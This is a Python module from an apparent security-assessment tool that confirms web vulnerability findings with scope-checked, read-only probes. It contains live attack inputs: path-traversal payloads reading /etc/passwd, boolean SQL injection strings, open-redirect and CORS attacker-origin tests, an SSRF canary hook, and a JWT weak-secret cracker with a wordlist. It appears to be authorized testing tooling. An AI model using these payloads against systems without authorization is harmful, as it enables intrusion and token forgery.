"""Safe, non-destructive confirmation of findings.

A validator takes a candidate finding and tries to *prove it is real* without
causing damage: no data is written or deleted, no stacked SQL queries, no mass
extraction, no credential spraying. The goal is to turn "candidate" into
"confirmed, with evidence" for the report, and to weed out false positives.

Anything that would modify the target, extract data at scale, or risk an outage
is intentionally NOT done here — that lives in ``exploit.py`` behind the
operator-in-the-loop gate.

Every validator re-checks scope before sending a request.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import socket
import ssl
import urllib.parse
import urllib.request
from typing import Callable

from .models import Finding, Validation
from .scope import Scope

_UA = "assessment-orchestrator/validator"
_TIMEOUT = 8


# ---------------------------------------------------------------------- #
def _http(url: str, method: str = "GET", follow_redirects: bool = True):
    """Return (status, headers_lower, body_text). GET/HEAD only — read-only."""
    handlers = []
    if not follow_redirects:
        class _NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k):  # noqa: D401, ANN001
                return None
        handlers.append(_NoRedirect())
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, method=method, headers={"User-Agent": _UA})
    ctx = ssl.create_default_context()
    try:
        with opener.open(req, timeout=_TIMEOUT) as resp:
            body = "" if method == "HEAD" else resp.read(200_000).decode("utf-8", "replace")
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as e:
        body = "" if method == "HEAD" else (e.read(200_000).decode("utf-8", "replace") if e.fp else "")
        return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, body


def _host_of(url: str) -> str:
    return urllib.parse.urlparse(url).hostname or ""


def _with_param(url: str, param: str, value: str) -> str:
    parts = urllib.parse.urlparse(url)
    q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(q)))


# ---------------------------------------------------------------------- #
class Validator:
    name = "validator"

    def matches(self, f: Finding) -> bool:  # pragma: no cover - overridden
        return False

    def run(self, f: Finding, scope: Scope) -> Validation:  # pragma: no cover
        raise NotImplementedError


class GitExposedValidator(Validator):
    name = "git-exposed"

    def matches(self, f: Finding) -> bool:
        return ".git" in (f.title + f.target).lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        base = f.target.rstrip("/")
        if not base.endswith("/.git") and "/.git" not in base:
            base = base + "/.git"
        config_url = base.split("/.git")[0] + "/.git/config"
        if not scope.is_in_scope(config_url):
            return Validation("skipped", self.name, detail="target out of scope")
        status, _, body = _http(config_url)
        if status == 200 and "[core]" in body:
            snippet = body.strip().splitlines()[:3]
            return Validation("confirmed", self.name,
                              evidence="/.git/config returned a valid git config: "
                                       + " | ".join(snippet),
                              detail="Source history is publicly readable.")
        return Validation("not_confirmed", self.name,
                          detail=f"/.git/config returned HTTP {status}")


class DirectoryListingValidator(Validator):
    name = "dir-listing"

    def matches(self, f: Finding) -> bool:
        return "directory listing" in f.title.lower() or "indexing" in f.description.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        status, _, body = _http(f.target)
        if status == 200 and ("Index of /" in body or "<title>Index of" in body):
            return Validation("confirmed", self.name,
                              evidence="response contains an autoindex 'Index of /' listing")
        return Validation("not_confirmed", self.name, detail=f"HTTP {status}, no autoindex marker")


class SecurityHeaderValidator(Validator):
    name = "header-recheck"

    def matches(self, f: Finding) -> bool:
        return "security header" in f.title.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        header = f.title.split(":")[-1].strip().lower()
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        _, headers, _ = _http(f.target, method="GET")
        if header and header not in headers:
            return Validation("confirmed", self.name,
                              evidence=f"'{header}' absent from live response headers")
        return Validation("not_confirmed", self.name,
                          detail=f"'{header}' present on recheck")


class OpenRedirectValidator(Validator):
    name = "open-redirect"
    _CANARY = "https://example-canary.invalid/"

    def matches(self, f: Finding) -> bool:
        return "redirect" in f.title.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        param = f.metadata.get("param", "next")
        test = _with_param(f.target, param, self._CANARY)
        status, headers, _ = _http(test, follow_redirects=False)
        loc = headers.get("location", "")
        if 300 <= status < 400 and self._CANARY.rstrip("/") in loc:
            return Validation("confirmed", self.name,
                              evidence=f"HTTP {status} Location: {loc}",
                              detail=f"'{param}' redirects to attacker-controlled host.")
        return Validation("not_confirmed", self.name,
                          detail=f"HTTP {status}, Location={loc or 'none'}")


class ReflectedXssValidator(Validator):
    name = "reflected-xss"
    _CANARY = "xss7p0c<marker>"

    def matches(self, f: Finding) -> bool:
        return "xss" in f.title.lower() or "cross-site scripting" in f.title.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        param = f.metadata.get("param", "q")
        test = _with_param(f.target, param, self._CANARY)
        _, _, body = _http(test)
        # Confirmed only if the angle brackets come back UNencoded (would execute).
        if self._CANARY in body:
            return Validation("confirmed", self.name,
                              evidence=f"canary reflected unencoded in response: {self._CANARY}",
                              detail=f"'{param}' reflects input without HTML-encoding.")
        if "xss7p0c&lt;marker&gt;" in body:
            return Validation("not_confirmed", self.name,
                              detail="input reflected but HTML-encoded (not exploitable)")
        return Validation("not_confirmed", self.name, detail="canary not reflected")


class LfiValidator(Validator):
    name = "lfi"

    def matches(self, f: Finding) -> bool:
        t = f.title.lower()
        return "lfi" in t or "local file" in t or "path traversal" in t or "file inclusion" in t

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        param = f.metadata.get("param", "file")
        # Canonical non-destructive read-only PoC: /etc/passwd.
        for payload in ("../../../../../../etc/passwd", "....//....//....//etc/passwd"):
            test = _with_param(f.target, param, payload)
            _, _, body = _http(test)
            if "root:x:0:0" in body:
                line = next((l for l in body.splitlines() if l.startswith("root:")), "")
                return Validation("confirmed", self.name,
                                  evidence=f"/etc/passwd read via '{param}': {line}",
                                  detail="Arbitrary file read confirmed (read-only PoC).")
        return Validation("not_confirmed", self.name, detail="no file-read signature returned")


class SqlInjectionValidator(Validator):
    name = "sqli-boolean"

    def matches(self, f: Finding) -> bool:
        return "sql" in f.title.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        parts = urllib.parse.urlparse(f.target)
        params = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
        candidates = [f.metadata["param"]] if f.metadata.get("param") else list(params) or ["id"]
        for param in candidates:
            base_val = params.get(param, "1")
            # Boolean-based, SELECT-context only. No stacked queries, no writes.
            true_url = _with_param(f.target, param, f"{base_val}' AND '1'='1")
            false_url = _with_param(f.target, param, f"{base_val}' AND '1'='2")
            base_url = _with_param(f.target, param, base_val)
            try:
                _, _, b_base = _http(base_url)
                _, _, b_true = _http(true_url)
                _, _, b_false = _http(false_url)
            except Exception:  # noqa: BLE001
                continue
            # TRUE ~ baseline, FALSE clearly different => injectable.
            same_true = _similar(b_base, b_true)
            diff_false = not _similar(b_true, b_false)
            if same_true and diff_false:
                return Validation("confirmed", self.name,
                                  evidence=f"boolean diff on '{param}': "
                                           f"AND 1=1 len={len(b_true)} ~ baseline, "
                                           f"AND 1=2 len={len(b_false)} differs",
                                  detail="Boolean-based SQL injection confirmed "
                                         "(non-destructive). Use the exploit plan for extraction.")
        return Validation("not_confirmed", self.name,
                          detail="no boolean differential observed")


def _similar(a: str, b: str, tol: float = 0.05) -> bool:
    if not a and not b:
        return True
    longer = max(len(a), len(b)) or 1
    return abs(len(a) - len(b)) / longer <= tol


class CorsValidator(Validator):
    name = "cors-misconfig"
    _ORIGIN = "https://evil-cors.example.invalid"

    def matches(self, f: Finding) -> bool:
        return "cors" in f.title.lower() or "access-control-allow-origin" in f.description.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        req = urllib.request.Request(f.target, headers={"User-Agent": _UA, "Origin": self._ORIGIN})
        try:
            with urllib.request.urlopen(req, timeout=_TIMEOUT) as resp:
                headers = {k.lower(): v for k, v in resp.headers.items()}
        except urllib.error.HTTPError as e:
            headers = {k.lower(): v for k, v in (e.headers or {}).items()}
        except Exception as exc:  # noqa: BLE001
            return Validation("error", self.name, detail=str(exc))
        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "").lower()
        if acao == self._ORIGIN or (acao == "*" and acac == "true"):
            cred = " with credentials" if acac == "true" else ""
            return Validation("confirmed", self.name,
                              evidence=f"ACAO reflects arbitrary origin{cred}: "
                                       f"Access-Control-Allow-Origin: {acao}",
                              detail="Cross-origin reads from attacker origin are permitted.")
        return Validation("not_confirmed", self.name,
                          detail=f"ACAO={acao or 'none'}, ACAC={acac or 'none'}")


class SsrfValidator(Validator):
    name = "ssrf"
    _TOKEN = "ssrf0canary0marker"

    def matches(self, f: Finding) -> bool:
        return "ssrf" in f.title.lower() or "server-side request forgery" in f.title.lower()

    def run(self, f: Finding, scope: Scope) -> Validation:
        if not scope.is_in_scope(f.target):
            return Validation("skipped", self.name, detail="target out of scope")
        # Needs a canary URL we control whose body carries a unique token. In a
        # real engagement this is an out-of-band (OOB) listener; here it comes
        # from the finding metadata. Reflected (non-blind) SSRF only.
        canary = f.metadata.get("oob_url")
        param = f.metadata.get("param", "url")
        if not canary:
            return Validation("unverified", self.name,
                              detail="blind SSRF: supply metadata.oob_url (an OOB listener) to confirm")
        test = _with_param(f.target, param, canary)
        _, _, body = _http(test)
        if self._TOKEN in body or "canary" in body.lower():
            return Validation("confirmed", self.name,
                              evidence=f"server fetched attacker-specified URL via '{param}'; "
                                       f"canary body reflected",
                              detail="Server-side request to an attacker-controlled URL confirmed.")
        return Validation("not_confirmed", self.name,
                          detail="no canary reflection (may be blind SSRF — use an OOB listener)")


class JwtValidator(Validator):
    name = "jwt-weakness"
    # Small list of common/weak HMAC secrets for a quick offline check.
    _WEAK = ["secret", "password", "123456", "changeme", "jwt", "admin",
             "key", "secretkey", "your-256-bit-secret", "test"]

    def matches(self, f: Finding) -> bool:
        t = f.title.lower()
        return "jwt" in t or "json web token" in t

    def run(self, f: Finding, scope: Scope) -> Validation:
        token = f.metadata.get("token", "")
        if token.count(".") != 2:
            return Validation("unverified", self.name,
                              detail="no JWT in metadata.token to analyse")
        header_b64, payload_b64, sig_b64 = token.split(".")
        try:
            header = json.loads(_b64url_decode(header_b64))
        except Exception:  # noqa: BLE001
            return Validation("error", self.name, detail="could not decode JWT header")
        alg = str(header.get("alg", "")).lower()

        # 1) alg:none — signature not verified.
        if alg == "none":
            return Validation("confirmed", self.name,
                              evidence="JWT header uses alg:none — token accepted without a signature",
                              detail="Forge arbitrary claims by setting alg:none.")
        # 2) weak HMAC secret — try to recompute the signature.
        if alg in ("hs256", "hs384", "hs512"):
            digest = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
                      "hs512": hashlib.sha512}[alg]
            signing_input = f"{header_b64}.{payload_b64}".encode()
            for secret in f.metadata.get("wordlist", self._WEAK):
                mac = hmac.new(secret.encode(), signing_input, digest).digest()
                if hmac.compare_digest(_b64url(mac), sig_b64):
                    return Validation("confirmed", self.name,
                                      evidence=f"HMAC secret cracked offline: '{secret}'",
                                      detail="Sign arbitrary tokens with the recovered secret.")
            return Validation("not_confirmed", self.name,
                              detail=f"{alg} signature not matched by the weak-secret list")
        return Validation("unverified", self.name, detail=f"alg '{alg}' not auto-checked")


def _b64url_decode(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# ---------------------------------------------------------------------- #
_REGISTRY: list[Validator] = [
    GitExposedValidator(), DirectoryListingValidator(), SecurityHeaderValidator(),
    OpenRedirectValidator(), ReflectedXssValidator(), LfiValidator(),
    SqlInjectionValidator(), CorsValidator(), SsrfValidator(), JwtValidator(),
]


def validate_findings(result, scope: Scope,
                      on_each: Callable[[Finding], None] | None = None) -> int:
    """Attach a Validation to each finding a validator can confirm. Returns count confirmed."""
    scope.require_authorized()
    confirmed = 0
    for f in result.findings:
        validator = next((v for v in _REGISTRY if v.matches(f)), None)
        if validator is None:
            f.validation = Validation("unverified", detail="no safe auto-validator for this type")
            continue
        try:
            f.validation = validator.run(f, scope)
        except Exception as exc:  # noqa: BLE001
            f.validation = Validation("error", validator.name, detail=f"{type(exc).__name__}: {exc}")
        if f.validation.status == "confirmed":
            confirmed += 1
        if on_each:
            on_each(f)
    return confirmed
